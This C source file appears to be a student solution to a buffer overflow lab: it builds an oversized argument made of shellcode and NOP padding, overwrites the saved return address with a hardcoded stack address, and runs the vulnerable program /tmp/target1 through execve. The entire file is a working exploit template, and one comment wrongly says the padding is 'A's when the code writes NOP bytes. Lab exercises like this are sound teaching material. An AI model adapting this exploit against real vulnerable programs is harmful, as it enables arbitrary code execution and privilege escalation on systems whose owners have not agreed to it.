#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"


int main(void)
{
  char *args[3];
  char *env[1];

  /****************************************
   *********** CODE BEGINS HERE ***********/

  int i = 0;
  args[1] = malloc(107);

  // fill entire argument with 'A's
  memset(args[1],'\x90',107);

  // fill first with shellcode 
  memcpy (args[1], shellcode, strlen(shellcode));  

  // overwrite eip to point to buf
  *(long *)(args[1] + 102) = 0xbffffda6;   

  // null terminate
  args[1][106] = '\x00';   

  /************ CODE ENDS HERE ************
   ****************************************/

  args[0] = TARGET;
  args[2] = NULL;
  env[0] = NULL;
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
